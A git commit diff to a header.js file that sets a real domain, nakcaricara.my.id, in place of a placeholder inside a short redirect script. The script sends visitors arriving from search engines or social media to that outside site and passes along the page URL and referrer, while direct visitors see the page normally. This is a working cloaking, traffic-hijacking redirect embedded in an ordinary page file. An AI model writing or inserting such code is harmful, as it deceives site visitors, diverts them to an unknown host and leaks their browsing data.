82eb509afc0e9ac5a882fba5caae30d668035184
randomap1 <118092966+randomap1@users.noreply.github.com>
2022-11-13 11:45:57 +0700

    Update header.js

--- header.js
+++ header.js
@@ -1,5 +1,5 @@
   //<![CDATA[
-var ars = 'http://nama-domain.com';
+var ars = 'http://nakcaricara.my.id';
 
 if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'brave.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
 //]]>
